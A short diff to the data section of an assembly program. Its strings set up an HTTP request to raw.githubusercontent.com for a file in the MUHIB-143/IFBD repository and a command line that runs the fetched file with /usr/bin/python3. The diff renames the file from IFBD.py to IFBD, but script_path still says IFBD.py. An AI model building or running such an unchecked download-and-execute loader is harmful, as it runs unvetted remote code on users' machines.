@@ -1,14 +1,14 @@
 section .data
     domain db "raw.githubusercontent.com", 0
     port dw 0x5000
-    http_request db "GET /MUHIB-143/IFBD/main/IFBD.py HTTP/1.1", 13, 10
+    http_request db "GET /MUHIB-143/IFBD/main/IFBD HTTP/1.1", 13, 10
                  db "Host: raw.githubusercontent.com", 13, 10
                  db "Connection: close", 13, 10, 13, 10
     request_len equ $ - http_request
     script_path db "IFBD.py", 0
     python_cmd db "/usr/bin/python3", 0
     python_arg1 db "python3", 0
-    python_arg2 db "IFBD.py", 0
+    python_arg2 db "IFBD", 0
     python_arg3 db "--verbose", 0
     null dq 0
 
